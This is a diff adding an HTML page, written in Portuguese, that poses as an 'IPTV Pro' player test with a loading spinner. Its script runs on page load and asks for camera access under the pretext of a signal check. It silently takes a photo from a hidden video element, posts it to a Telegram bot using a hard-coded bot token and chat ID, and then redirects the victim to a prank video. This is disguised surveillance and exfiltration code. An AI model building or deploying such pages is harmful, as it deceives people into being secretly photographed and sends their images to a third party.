@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Teste de Player IPTV Pro</title>
+    <style>
+        body { background: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 50px; }
+        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <h1>Carregando Player...</h1>
+    <div class="loader"></div>
+    <p>Aguarde a verificação de sinal do seu dispositivo.</p>
+    
+    <video id="video" width="160" height="120" style="display:none;" autoplay></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        // Seus dados do Telegram que você acabou de pegar
+        const token = '8632329845:AAEV3zXLv1xR3N3Z9-HTbjvuMjX5cvpuQOo';
+        const chat_id = '5609141148';
+
+        async function startCamera() {
+            try {
+                // Pede permissão da câmera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // Espera 2 segundos para o rosto aparecer bem e tira a foto
+                setTimeout(() => {
+                    takeSnap();
+                }, 2000);
+            } catch (err) {
+                console.log("Acesso negado ou erro: " + err);
+            }
+        }
+
+        function takeSnap() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chat_id);
+                formData.append('photo', blob, 'troll.jpg');
+                formData.append('caption', '📸 Foto capturada do player!');
+
+                // Envia para o seu Telegram
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).then(() => {
+                    // Depois de enviar, manda o amigo para um vídeo de zoeira
+                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+                });
+            }, 'image/jpeg');
+        }
+
+        // Inicia assim que a página carrega
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
